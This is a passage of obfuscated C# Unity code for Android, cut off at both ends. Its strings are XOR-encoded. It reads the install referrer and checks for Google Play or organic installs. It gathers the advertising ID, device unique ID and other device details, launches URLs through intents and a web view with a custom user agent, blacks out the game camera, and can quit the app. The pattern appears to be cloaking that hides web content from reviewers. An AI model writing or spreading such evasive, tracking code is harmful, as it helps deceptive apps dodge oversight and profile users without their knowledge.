_0x1ef3e38c._0xdf7d4e91(new byte[52] { 152, 153, 154, 212, 140, 142, 147, 136, 147, 208, 219, 157, 140, 140, 170, 153, 142, 143, 149, 147, 146, 219, 208, 137, 157, 210, 142, 153, 140, 144, 157, 159, 153, 212, 211, 162, 177, 147, 134, 149, 144, 144, 157, 160, 211, 211, 208, 219, 219, 213, 213, 199 }, 252) + _0x1ef3e38c._0xdf7d4e91(new byte[37] { 54, 55, 52, 122, 34, 32, 61, 38, 61, 126, 117, 34, 62, 51, 38, 52, 61, 32, 63, 117, 126, 117, 30, 59, 60, 39, 42, 114, 51, 32, 63, 36, 106, 62, 117, 123, 105 }, 82) + _0x1ef3e38c._0xdf7d4e91(new byte[34] { 68, 69, 70, 8, 80, 82, 79, 84, 79, 12, 7, 86, 69, 78, 68, 79, 82, 7, 12, 7, 103, 79, 79, 71, 76, 69, 0, 105, 78, 67, 14, 7, 9, 27 }, 32) + _0x1ef3e38c._0xdf7d4e91(new byte[30] { 205, 204, 207, 129, 217, 219, 198, 221, 198, 133, 142, 196, 200, 209, 253, 198, 220, 202, 193, 249, 198, 192, 199, 221, 218, 142, 133, 156, 128, 146 }, 169) + _0x1ef3e38c._0xdf7d4e91(new byte[48] { 142, 136, 131, 129, 140, 155, 136, 218, 143, 155, 158, 199, 129, 152, 136, 155, 148, 158, 137, 192, 161, 129, 152, 136, 155, 148, 158, 192, 221, 185, 146, 136, 149, 151, 147, 143, 151, 221, 214, 140, 159, 136, 137, 147, 149, 148, 192, 221 }, 250) + _0x38c83fd8 + _0x1ef3e38c._0xdf7d4e91(new byte[35] { 118, 44, 125, 42, 51, 35, 48, 63, 53, 107, 118, 22, 62, 62, 54, 61, 52, 113, 18, 57, 35, 62, 60, 52, 118, 125, 39, 52, 35, 34, 56, 62, 63, 107, 118 }, 81) + _0x38c83fd8 + _0x1ef3e38c._0xdf7d4e91(new byte[238] { 180, 238, 191, 232, 241, 225, 242, 253, 247, 169, 180, 221, 252, 231, 174, 210, 172, 209, 225, 242, 253, 247, 180, 191, 229, 246, 225, 224, 250, 252, 253, 169, 180, 161, 167, 180, 238, 206, 191, 254, 252, 241, 250, 255, 246, 169, 231, 225, 230, 246, 191, 227, 255, 242, 231, 245, 252, 225, 254, 169, 180, 210, 253, 247, 225, 252, 250, 247, 180, 191, 244, 246, 231, 219, 250, 244, 251, 214, 253, 231, 225, 252, 227, 234, 197, 242, 255, 230, 246, 224, 169, 245, 230, 253, 240, 231, 250, 252, 253, 187, 186, 232, 225, 246, 231, 230, 225, 253, 179, 195, 225, 252, 254, 250, 224, 246, 189, 225, 246, 224, 252, 255, 229, 246, 187, 232, 242, 225, 240, 251, 250, 231, 246, 240, 231, 230, 225, 246, 169, 180, 242, 225, 254, 180, 191, 241, 250, 231, 253, 246, 224, 224, 169, 180, 165, 167, 180, 191, 254, 252, 241, 250, 255, 246, 169, 231, 225, 230, 246, 191, 254, 252, 247, 246, 255, 169, 180, 180, 191, 227, 255, 242, 231, 245, 252, 225, 254, 169, 180, 210, 253, 247, 225, 252, 250, 247, 180, 191, 227, 255, 242, 231, 245, 252, 225, 254, 197, 246, 225, 224, 250, 252, 253, 169, 180, 162, 167, 189, 163, 189, 163, 180, 191, 230, 242, 213, 230, 255, 255, 197, 246, 225, 224, 250, 252, 253, 169, 180 }, 147) + _0x38c83fd8 + _0x1ef3e38c._0xdf7d4e91(new byte[117] { 26, 4, 26, 4, 26, 4, 19, 73, 29, 15, 73, 73, 15, 123, 86, 94, 81, 87, 64, 26, 80, 81, 82, 93, 90, 81, 100, 70, 91, 68, 81, 70, 64, 77, 28, 68, 70, 91, 64, 91, 24, 19, 65, 71, 81, 70, 117, 83, 81, 90, 64, 112, 85, 64, 85, 19, 24, 79, 83, 81, 64, 14, 82, 65, 90, 87, 64, 93, 91, 90, 28, 29, 79, 70, 81, 64, 65, 70, 90, 20, 65, 85, 80, 15, 73, 24, 87, 91, 90, 82, 93, 83, 65, 70, 85, 86, 88, 81, 14, 64, 70, 65, 81, 73, 29, 15, 73, 87, 85, 64, 87, 92, 28, 81, 29, 79, 73 }, 52) + _0x1ef3e38c._0xdf7d4e91(new byte[5] { 11, 95, 94, 95, 77 }, 118);
    }

    private bool _0x70fccd3e(string _0x8bc41c74)
    {
        try
        {
            using (var _0xa9fe1e27 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 135, 139, 137, 202, 145, 138, 141, 144, 157, 215, 128, 202, 148, 136, 133, 157, 129, 150, 202, 177, 138, 141, 144, 157, 180, 136, 133, 157, 129, 150 }, 228)))
            using (var _0x3c890e30 = _0xa9fe1e27.GetStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 24, 14, 9, 9, 30, 21, 15, 58, 24, 15, 18, 13, 18, 15, 2 }, 123)))
            using (var _0x3f21b9ab = _0x3c890e30.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[17] { 40, 42, 59, 31, 46, 44, 36, 46, 40, 42, 2, 46, 33, 46, 40, 42, 61 }, 79)))
            using (var _0x16a590a4 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[22] { 253, 242, 248, 238, 243, 245, 248, 178, 255, 243, 242, 232, 249, 242, 232, 178, 213, 242, 232, 249, 242, 232 }, 156)))
            using (var _0x14d126d3 = _0x16a590a4.CallStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 153, 136, 155, 154, 140, 188, 155, 128 }, 233), _0x8bc41c74, 1))
            {
                string _0x723af465 = _0x14d126d3.Call<string>(_0x1ef3e38c._0xdf7d4e91(new byte[14] { 121, 123, 106, 77, 106, 108, 119, 112, 121, 91, 102, 106, 108, 127 }, 30), _0x1ef3e38c._0xdf7d4e91(new byte[20] { 18, 2, 31, 7, 3, 21, 2, 47, 22, 17, 28, 28, 18, 17, 19, 27, 47, 5, 2, 28 }, 112));
                string _0x26bc4f3b = _0x14d126d3.Call<string>(_0x1ef3e38c._0xdf7d4e91(new byte[10] { 138, 136, 153, 189, 140, 142, 134, 140, 138, 136 }, 237));
                _0x14d126d3.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[11] { 22, 19, 19, 52, 22, 3, 18, 16, 24, 5, 14 }, 119), _0x1ef3e38c._0xdf7d4e91(new byte[33] { 221, 210, 216, 206, 211, 213, 216, 146, 213, 210, 200, 217, 210, 200, 146, 223, 221, 200, 217, 219, 211, 206, 197, 146, 254, 238, 243, 235, 239, 253, 254, 240, 249 }, 188));
                _0x14d126d3.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[11] { 128, 151, 159, 157, 132, 151, 183, 138, 134, 128, 147 }, 242), _0x1ef3e38c._0xdf7d4e91(new byte[20] { 74, 90, 71, 95, 91, 77, 90, 119, 78, 73, 68, 68, 74, 73, 75, 67, 119, 93, 90, 68 }, 40));
                if (_0x14d126d3.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 44, 59, 45, 49, 50, 40, 59, 31, 61, 42, 55, 40, 55, 42, 39 }, 94), _0x3f21b9ab) != null)
                {
                    WLog(_0x1ef3e38c._0xdf7d4e91(new byte[24] { 22, 61, 39, 58, 56, 48, 25, 60, 62, 48, 117, 58, 37, 48, 59, 117, 60, 59, 33, 48, 59, 33, 111, 117 }, 85) + _0x8bc41c74);
                    _0x14d126d3.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 60, 57, 57, 27, 49, 60, 58, 46 }, 93), 0x10000000);
                    _0x3c890e30.Call(_0x1ef3e38c._0xdf7d4e91(new byte[13] { 188, 187, 174, 189, 187, 142, 172, 187, 166, 185, 166, 187, 182 }, 207), _0x14d126d3);
                    return true;
                }

                if (_0x508bb960(_0x26bc4f3b))
                    return true;
                if (!string.IsNullOrEmpty(_0x723af465))
                {
                    WLog(_0x1ef3e38c._0xdf7d4e91(new byte[28] { 176, 155, 129, 156, 158, 150, 191, 154, 152, 150, 211, 154, 157, 135, 150, 157, 135, 211, 149, 146, 159, 159, 145, 146, 144, 152, 201, 211 }, 243) + _0x723af465);
                    if (_0x8a0d09fc(_0x723af465))
                        return _0x9d64c77c(_0x723af465, _0x26bc4f3b);
                    return _0x134a93db(_0x723af465);
                }

                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 29, 54, 44, 49, 51, 59, 18, 55, 53, 59, 126, 55, 48, 42, 59, 48, 42, 126, 48, 49, 126, 54, 63, 48, 58, 50, 59, 44, 100, 126 }, 94) + _0x8bc41c74);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[26] { 205, 230, 252, 225, 227, 235, 194, 231, 229, 235, 174, 231, 224, 250, 235, 224, 250, 174, 232, 239, 231, 226, 235, 234, 180, 174 }, 142) + e.Message);
            return true;
        }
    }

    internal bool IsGoogleAuthFlowUrl(string _0xe80c7df6)
    {
        if (string.IsNullOrEmpty(_0xe80c7df6))
            return false;
        return _0xe80c7df6.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[19] { 6, 4, 4, 8, 18, 9, 19, 20, 73, 0, 8, 8, 0, 11, 2, 73, 4, 8, 10 }, 103), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe80c7df6.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[16] { 26, 24, 24, 20, 14, 21, 15, 8, 85, 28, 20, 20, 28, 23, 30, 85 }, 123), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe80c7df6.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[21] { 179, 187, 187, 179, 184, 177, 161, 167, 177, 166, 183, 187, 186, 160, 177, 186, 160, 250, 183, 187, 185 }, 212), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe80c7df6.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[11] { 213, 193, 198, 211, 198, 219, 209, 156, 209, 221, 223 }, 178), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private IEnumerator _0x4810d99f()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[26] { 206, 193, 240, 230, 225, 200, 181, 220, 251, 252, 225, 252, 244, 249, 252, 239, 240, 199, 240, 243, 243, 240, 231, 240, 231, 181 }, 149));
            }
#endif
        }

        bool _0x1b2d2591 = false;
        InstallReferrer.GetReferrer((_0x800ad5bb) =>
        {
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[24] { 85, 90, 107, 125, 122, 46, 92, 107, 104, 107, 124, 124, 107, 124, 83, 46, 105, 107, 122, 46, 236, 136, 156, 46 }, 14) + _0xf46faa70);
            if (_0x800ad5bb.IsSuccess)
            {
                _0xf46faa70 = _0x800ad5bb.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[28] { 145, 158, 175, 185, 190, 234, 152, 175, 172, 175, 184, 184, 175, 184, 151, 234, 153, 191, 169, 169, 175, 185, 185, 234, 40, 76, 88, 234 }, 202) + _0xf46faa70);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[27] { 126, 113, 64, 86, 81, 5, 119, 64, 67, 64, 87, 87, 64, 87, 120, 5, 99, 68, 76, 73, 64, 65, 5, 199, 163, 183, 5 }, 37) + _0x800ad5bb);
#endif
                }

                _0xf46faa70 = "";
            }

            _0x0f0f090c = true;
        });
        StartCoroutine(_0x381131b4(2f));
        yield return new WaitUntil(() => _0x0f0f090c);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xf46faa70}");
#endif
        }

        bool _0x7665bf43 = _0xf46faa70.Contains(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 94, 90, 85, 80, 93, 4 }, 57));
        _0x1b2d2591 = _0x7665bf43 || _0xf46faa70.Contains(_0x1ef3e38c._0xdf7d4e91(new byte[18] { 49, 32, 32, 35, 126, 57, 62, 35, 36, 49, 55, 34, 49, 61, 126, 51, 63, 61 }, 80)) || _0xf46faa70.Contains(_0x1ef3e38c._0xdf7d4e91(new byte[17] { 76, 93, 93, 94, 3, 75, 76, 78, 72, 79, 66, 66, 70, 3, 78, 66, 64 }, 45));
        _0x5afeb8ed = _0x7665bf43 ? "" : (_0x1b2d2591 ? "" : _0x5afeb8ed);
        _0x5afeb8ed = _0x5afeb8ed ?? "";
        _0xbb472277 = _0xbb472277 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x5afeb8ed}");
#endif
        }
    }

    private void _0x751181a2()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private bool _0x508bb960(string _0x7fb55a48)
    {
        if (string.IsNullOrEmpty(_0x7fb55a48))
            return false;
        try
        {
            using (var _0x2947438d = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 105, 101, 103, 36, 127, 100, 99, 126, 115, 57, 110, 36, 122, 102, 107, 115, 111, 120, 36, 95, 100, 99, 126, 115, 90, 102, 107, 115, 111, 120 }, 10)))
            using (var _0xe0563451 = _0x2947438d.GetStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 255, 233, 238, 238, 249, 242, 232, 221, 255, 232, 245, 234, 245, 232, 229 }, 156)))
            using (var _0x1479b35a = _0xe0563451.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[17] { 69, 71, 86, 114, 67, 65, 73, 67, 69, 71, 111, 67, 76, 67, 69, 71, 80 }, 34)))
            using (var _0x35095d0a = _0x1479b35a.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 120, 122, 107, 83, 126, 106, 113, 124, 119, 86, 113, 107, 122, 113, 107, 89, 112, 109, 79, 126, 124, 116, 126, 120, 122 }, 31), _0x7fb55a48))
            {
                if (_0x35095d0a == null)
                    return false;
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[37] { 109, 70, 92, 65, 67, 75, 98, 71, 69, 75, 14, 66, 79, 91, 64, 77, 70, 14, 71, 64, 93, 90, 79, 66, 66, 75, 74, 14, 94, 79, 77, 69, 79, 73, 75, 20, 14 }, 46) + _0x7fb55a48);
                _0x35095d0a.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 99, 102, 102, 68, 110, 99, 101, 113 }, 2), 0x10000000);
                _0xe0563451.Call(_0x1ef3e38c._0xdf7d4e91(new byte[13] { 220, 219, 206, 221, 219, 238, 204, 219, 198, 217, 198, 219, 214 }, 175), _0x35095d0a);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private bool _0x134a93db(string _0x2385e97c)
    {
        try
        {
            using (var _0x34eac578 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 196, 200, 202, 137, 210, 201, 206, 211, 222, 148, 195, 137, 215, 203, 198, 222, 194, 213, 137, 242, 201, 206, 211, 222, 247, 203, 198, 222, 194, 213 }, 167)))
            using (var _0xd3e9e828 = _0x34eac578.GetStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 108, 122, 125, 125, 106, 97, 123, 78, 108, 123, 102, 121, 102, 123, 118 }, 15)))
            using (var _0x94daa528 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 172, 163, 169, 191, 162, 164, 169, 227, 163, 168, 185, 227, 152, 191, 164 }, 205)))
            using (var _0xf6125963 = _0x94daa528.CallStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[5] { 225, 240, 227, 226, 244 }, 145), _0x2385e97c))
            using (var _0x8efba086 = new AndroidJavaObject(_0x1ef3e38c._0xdf7d4e91(new byte[22] { 254, 241, 251, 237, 240, 246, 251, 177, 252, 240, 241, 235, 250, 241, 235, 177, 214, 241, 235, 250, 241, 235 }, 159), _0x1ef3e38c._0xdf7d4e91(new byte[26] { 207, 192, 202, 220, 193, 199, 202, 128, 199, 192, 218, 203, 192, 218, 128, 207, 205, 218, 199, 193, 192, 128, 248, 231, 235, 249 }, 174), _0xf6125963))
            {
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[26] { 209, 250, 224, 253, 255, 247, 222, 251, 249, 247, 178, 253, 226, 247, 252, 178, 247, 234, 230, 247, 224, 252, 243, 254, 168, 178 }, 146) + _0x2385e97c);
                _0x8efba086.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[11] { 224, 229, 229, 194, 224, 245, 228, 230, 238, 243, 248 }, 129), _0x1ef3e38c._0xdf7d4e91(new byte[33] { 169, 166, 172, 186, 167, 161, 172, 230, 161, 166, 188, 173, 166, 188, 230, 171, 169, 188, 173, 175, 167, 186, 177, 230, 138, 154, 135, 159, 155, 137, 138, 132, 141 }, 200));
                _0x8efba086.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 255, 250, 250, 216, 242, 255, 249, 237 }, 158), 0x10000000);
                _0xd3e9e828.Call(_0x1ef3e38c._0xdf7d4e91(new byte[13] { 136, 143, 154, 137, 143, 186, 152, 143, 146, 141, 146, 143, 130 }, 251), _0x8efba086);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[28] { 130, 169, 179, 174, 172, 164, 141, 168, 170, 164, 225, 164, 185, 181, 164, 179, 175, 160, 173, 225, 167, 160, 168, 173, 164, 165, 251, 225 }, 193) + e.Message);
            Application.OpenURL(_0x2385e97c);
            return true;
        }
    }

    private void _0xce9bc24c(string _0x0147b618)
    {
        bool _0xcd54db33 = !string.IsNullOrEmpty(_0x0147b618);
        if (_0xcd54db33)
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[13] { 131, 140, 189, 171, 172, 133, 248, 139, 176, 183, 175, 226, 248 }, 216) + _0x0147b618);
#endif
            }

            _0x655f0f73(_0x0147b618);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[39] { 92, 83, 98, 116, 115, 90, 39, 65, 102, 107, 107, 101, 102, 100, 108, 39, 229, 129, 149, 39, 64, 102, 106, 98, 39, 47, 105, 104, 39, 97, 110, 105, 102, 107, 39, 82, 85, 75, 46 }, 7));
#endif
            }

            _0x0ec45f13();
            return;
        }
    }

    private bool _0x8e4d9e61 = false;
    private bool _0x811d32fd = false;
    private int _0x9325ccd8 = 5, _0xa2152a3f = 5, _0x971ada40 = 5, _0xa8fe40b1 = 5;
    private void _0x2eef389e(string _0x66635a3f)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[34] { 169, 166, 151, 129, 134, 175, 210, 180, 151, 134, 145, 154, 210, 183, 138, 134, 128, 147, 210, 162, 135, 129, 154, 210, 182, 147, 134, 147, 210, 160, 147, 133, 200, 210 }, 242) + _0x66635a3f);
#endif
            }
        }

        var _0xf88a522e = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x66635a3f);
        StartCoroutine(_0xd9093ada(_0xf88a522e));
    }

    internal Rect lastSafe = Rect.zero;
    private bool _0xd90d893f = false;
    private Task _0x0facfbcc(IEnumerator _0x363af5f4)
    {
        var _0x743e165b = new TaskCompletionSource<bool>();
        StartCoroutine(_0x62ea96c5(_0x363af5f4, _0x743e165b));
        return _0x743e165b.Task;
    }

    // PART 3
    private string _0x447d9868()
    {
        try
        {
            var _0x36bc9cfe = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 102, 106, 104, 43, 112, 107, 108, 113, 124, 54, 97, 43, 117, 105, 100, 124, 96, 119, 43, 80, 107, 108, 113, 124, 85, 105, 100, 124, 96, 119 }, 5));
            var _0x37c050a4 = _0x36bc9cfe.GetStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 168, 190, 185, 185, 174, 165, 191, 138, 168, 191, 162, 189, 162, 191, 178 }, 203));
            var _0x4376f396 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[57] { 153, 149, 151, 212, 157, 149, 149, 157, 150, 159, 212, 155, 148, 158, 136, 149, 147, 158, 212, 157, 151, 137, 212, 155, 158, 137, 212, 147, 158, 159, 148, 142, 147, 156, 147, 159, 136, 212, 187, 158, 140, 159, 136, 142, 147, 137, 147, 148, 157, 179, 158, 185, 150, 147, 159, 148, 142 }, 250));
            var _0x5805d502 = _0x4376f396.CallStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[20] { 119, 117, 100, 81, 116, 102, 117, 98, 100, 121, 99, 121, 126, 119, 89, 116, 89, 126, 118, 127 }, 16), _0x37c050a4);
            var _0x7e9e8e13 = _0x5805d502.Call<string>(_0x1ef3e38c._0xdf7d4e91(new byte[5] { 160, 162, 179, 142, 163 }, 199));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x7e9e8e13}");
#endif
            }

            return string.IsNullOrEmpty(_0x7e9e8e13) ? "" : _0x7e9e8e13;
        }
        catch
        {
            return "";
        }
    }

    private void _0x4a9b2c8e(bool _0xa662355a)
    {
        _0x2126d7a4();
        _0x1d91f637.SetActive(_0xa662355a);
        _0xd90d893f = _0xa662355a;
        if (_0xa662355a)
        {
            _0x1d91f637.transform.SetAsLastSibling();
            if (_0x166000ef != null)
                _0x166000ef.localRotation = Quaternion.identity;
        }
    }

    private async Task<bool> _0xda692961()
    {
        {
#if B_LOGS
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[29] { 226, 237, 220, 202, 205, 228, 153, 240, 202, 233, 203, 208, 207, 216, 218, 192, 248, 215, 221, 234, 216, 207, 220, 221, 250, 209, 220, 218, 210 }, 185));
#endif
        }

        string _0xd4157be3 = "";
        for (int _0xdde4c08e = 0; _0xdde4c08e < 2; _0xdde4c08e++)
        {
            if (await _0xa1fd6d24(1, 100))
            {
                await _0xd08c2883(_0x1ef3e38c._0xdf7d4e91(new byte[7] { 236, 226, 225, 237, 229, 235, 234 }, 142));
                _0x0ec45f13();
                return true;
            }

            _0xd4157be3 = await _0xd41dca0b(1, 100);
            if (!string.IsNullOrEmpty(_0xd4157be3))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0xd4157be3))
            {
                if (!string.IsNullOrEmpty(_0x2291ee43))
                {
                    _0xd4157be3 = _0x793fc76b(_0xd4157be3, _0x2291ee43);
                    {
#if B_LOGS
                        Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[53] { 123, 116, 69, 83, 84, 125, 0, 99, 65, 67, 72, 69, 68, 0, 70, 73, 78, 65, 76, 117, 82, 76, 0, 87, 73, 84, 72, 0, 83, 69, 78, 68, 73, 68, 0, 194, 166, 178, 0, 83, 72, 79, 87, 0, 119, 69, 66, 118, 73, 69, 87, 26, 0 }, 32) + _0xd4157be3);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[39] { 163, 172, 157, 139, 140, 165, 216, 187, 153, 155, 144, 157, 156, 216, 158, 145, 150, 153, 148, 173, 138, 148, 216, 26, 126, 106, 216, 139, 144, 151, 143, 216, 175, 157, 154, 174, 145, 157, 143 }, 248));
#endif
                    }
                }

                _0x3d14bc79 = true;
                _0x655f0f73(_0xd4157be3);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[44] { 108, 99, 82, 68, 67, 106, 23, 114, 79, 84, 82, 71, 67, 94, 88, 89, 23, 64, 95, 94, 91, 82, 23, 84, 95, 82, 84, 92, 94, 89, 80, 23, 68, 86, 65, 82, 83, 23, 91, 94, 89, 92, 13, 23 }, 55) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private int _0xa995fb58 = -1;
    private string _0xc0c4f746 = "";
    private string _0x173f2475 = "";
    internal bool firstLoadShown = false;
    internal bool isApplicationFocus = false;
    private void _0xcb343b13()
    {
        _0x097dfff6 = true;
        if (_0xacca79f6 != null)
            _0xacca79f6.SetUserAgent(_0x2eeeb950());
    }

    private string _0x517a0997 = "";
    private void _0x38f1c524()
    {
        if (_0x8e4d9e61)
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[18] { 219, 230, 247, 234, 190, 255, 242, 236, 251, 255, 250, 231, 190, 237, 246, 241, 233, 240 }, 158));
            return;
        }

        _0x4a9b2c8e(false);
        WLog(_0x1ef3e38c._0xdf7d4e91(new byte[46] { 6, 42, 34, 37, 107, 28, 46, 41, 29, 34, 46, 60, 107, 27, 62, 56, 35, 107, 5, 36, 63, 34, 45, 34, 40, 42, 63, 34, 36, 37, 107, 99, 35, 42, 57, 47, 60, 42, 57, 46, 107, 41, 42, 40, 32, 98 }, 75));
        ++_0x37aa1f19;
        _0x119a17d3();
        if (_0x37aa1f19 <= 1)
            return;
        if (_0xb79416a1())
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[37] { 247, 202, 219, 198, 146, 193, 217, 219, 194, 194, 215, 214, 146, 159, 140, 146, 194, 221, 194, 199, 194, 193, 146, 193, 198, 219, 222, 222, 146, 221, 194, 215, 220, 215, 214, 136, 146 }, 178) + _0x776a3ae9.Count);
            return;
        }

        Application.Quit();
    }

    private void _0x916c99b0()
    {
        {
#if B_LOGS
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[22] { 13, 2, 51, 37, 34, 11, 118, 5, 34, 57, 36, 51, 18, 51, 32, 63, 53, 51, 31, 56, 48, 57 }, 86));
#endif
        }

        _0x144a93a5 = SystemInfo.deviceModel;
        _0x14fc4a24 = Application.version;
        _0x4118a231 = Application.installMode;
        _0x796bf546 = Application.installerName;
        _0x91e0fd92 = Application.identifier;
        _0xc169bbe0 = _0x447d9868();
        _0xb232c249 = _0xf01833cd();
        _0xc0c4f746 = SystemInfo.deviceUniqueIdentifier;
        _0x86ad9d15 = SystemInfo.graphicsDeviceName;
        _0x45f643e1 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x14fc4a24 = _0x1ef3e38c._0xdf7d4e91(new byte[5] { 49, 40, 49, 40, 49 }, 6);
                _0x4118a231 = ApplicationInstallMode.Store;
                _0x796bf546 = _0x1ef3e38c._0xdf7d4e91(new byte[19] { 35, 47, 45, 110, 33, 46, 36, 50, 47, 41, 36, 110, 54, 37, 46, 36, 41, 46, 39 }, 64);
                _0xb232c249 = _0x1ef3e38c._0xdf7d4e91(new byte[8] { 77, 69, 88, 92, 81, 8, 93, 73 }, 40);
                _0xc0c4f746 = Guid.NewGuid().ToString().Replace(_0x1ef3e38c._0xdf7d4e91(new byte[1] { 118 }, 91), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[17] { 122, 117, 68, 82, 85, 124, 1, 69, 68, 87, 108, 78, 69, 68, 77, 27, 1 }, 33) + _0x144a93a5);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[19] { 22, 25, 40, 62, 57, 16, 109, 44, 61, 61, 27, 40, 63, 62, 36, 34, 35, 119, 109 }, 77) + _0x14fc4a24);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[20] { 20, 27, 42, 60, 59, 18, 111, 38, 33, 60, 59, 46, 35, 35, 2, 32, 43, 42, 117, 111 }, 79) + _0x4118a231);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[23] { 155, 148, 165, 179, 180, 157, 224, 169, 174, 179, 180, 161, 172, 172, 165, 178, 147, 180, 175, 178, 165, 250, 224 }, 192) + _0x796bf546);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[14] { 143, 128, 177, 167, 160, 137, 244, 181, 164, 164, 157, 176, 238, 244 }, 212) + _0x91e0fd92);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[14] { 129, 142, 191, 169, 174, 135, 250, 187, 190, 172, 147, 190, 224, 250 }, 218) + _0xc169bbe0);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[18] { 124, 115, 66, 84, 83, 122, 7, 82, 84, 66, 85, 102, 64, 66, 73, 83, 29, 7 }, 39) + _0xb232c249);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[17] { 123, 116, 69, 83, 84, 125, 0, 83, 89, 83, 100, 69, 86, 105, 68, 26, 0 }, 32) + _0xc0c4f746);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[12] { 79, 64, 113, 103, 96, 73, 52, 115, 100, 97, 46, 52 }, 20) + _0x86ad9d15);
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[12] { 30, 17, 32, 54, 49, 24, 101, 38, 53, 48, 127, 101 }, 69) + _0x45f643e1);
#endif
        }
    }

    // WS_SOURCE MONO
    public static _0x4b3048ae _0x67672eae { get; private set; }
    private string _0xbb472277 { get; set; }

    private void _0x50d0b47a(UniWebView _0x44c6b739)
    {
        _0x44c6b739.BackgroundColor = Color.clear;
        _0x44c6b739.SetSupportMultipleWindows(true, true);
        _0x44c6b739.SetBackButtonEnabled(false);
        _0xacca79f6.SetUserAgent(_0x2eeeb950());
    }

    private async Task<bool> _0xa1fd6d24(int _0x9c9287c8 = 5, int _0xa8815b19 = 500)
    {
        List<EntityData> _0x6031ceeb = new List<EntityData>();
        int _0x09eaf443 = 0;
        do
        {
            try
            {
